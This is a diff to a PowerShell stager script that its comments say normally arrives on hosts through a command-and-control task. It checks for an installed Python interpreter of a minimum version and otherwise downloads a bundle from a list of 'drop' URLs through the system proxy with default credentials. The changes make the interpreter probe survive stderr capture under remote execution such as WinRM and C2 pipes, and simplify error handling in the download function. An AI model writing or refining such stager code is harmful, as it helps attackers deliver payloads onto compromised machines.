@@ -14,23 +14,37 @@ function sProbe {
         $sPath = $sCmd.Source
         if (-not $sPath) { continue }
         $sCode = 1
+        $sEap = $ErrorActionPreference
         try {
-            # Only stdout is redirected, and stderr is deliberately left
-            # alone. In Windows PowerShell 5.1 *any* `2>` redirection of a
-            # native command -- `2>&1` and `2>$null` alike -- routes its
-            # stderr lines through the command runtime as NativeCommandError
-            # records, and under 'Stop' the first one throws. The catch below
-            # would then read that as a failed version check, so an
-            # interpreter at or above the floor that printed one warning line
-            # would be judged unusable and a bundle fetched onto a host that
-            # already had a Python. Not redirecting stderr removes the
-            # capture rather than compensating for it; the cost is that the
-            # interpreter's own warnings reach the console, which for a
-            # pasted stager is no cost at all. Adding any `2>` here, however
-            # tidy it looks, puts the defect straight back.
+            # Two halves of one guard, because there are three ways a
+            # native command's stderr becomes NativeCommandError records
+            # that 'Stop' throws on -- and the catch below would read any
+            # such throw as a failed version check, judging an interpreter
+            # at or above the floor unusable and fetching a bundle onto a
+            # host that already had a Python.
+            #   1. This script redirecting stderr. In Windows PowerShell
+            #      5.1 any `2>` or `*>` on a native command promotes its
+            #      stderr -- `2>&1` and `2>$null` alike. Handled by not
+            #      redirecting it: only stdout goes to $null. Adding any
+            #      `2>` or `*>` here, however tidy it looks, puts the
+            #      defect straight back.
+            #   2. The *caller* redirecting this script's stderr, as in
+            #      `powershell -File ... 2> log`.
+            #   3. No console to inherit: ISE, WinRM, Invoke-Command,
+            #      Start-Process -RedirectStandardError, or a C2 task that
+            #      pipes both streams -- which is how this script normally
+            #      arrives on a host.
+            # Nothing here can stop 2 and 3 capturing stderr, so the
+            # verdict on the record is changed instead: 'Continue' for the
+            # two statements below, restored in the finally, which cannot
+            # be skipped. The window writes nothing and runs before any
+            # directory exists.
+            $ErrorActionPreference = 'Continue'
             & $sPath -c 'import sys;sys.exit(0 if sys.version_info[:2] >= (@@MIN_MAJOR@@, @@MIN_MINOR@@) else 1)' 1>$null
             $sCode = $LASTEXITCODE
-        } catch { $sCode = 1 }
+        } catch {
+            $sCode = 1
+        } finally { $ErrorActionPreference = $sEap }
         if ($sCode -eq 0) { return $sPath }
     }
     return $null
@@ -65,12 +79,7 @@ function sFetch($sUrl, $sOut) {
             $sProxy.Credentials = [Net.CredentialCache]::DefaultCredentials
             $sReq.Proxy = $sProxy
         }
-    } catch {
-        # Its own guard, because the caller turns a throw from here into
-        # "try the next drop": one environment quirk in these three lines
-        # would otherwise cost the whole list rather than one attempt.
-        # The request keeps whatever proxy it was given by default.
-    }
+    } catch { }
     $sRes = $sReq.GetResponse()
     try {
         $sIn = $sRes.GetResponseStream()
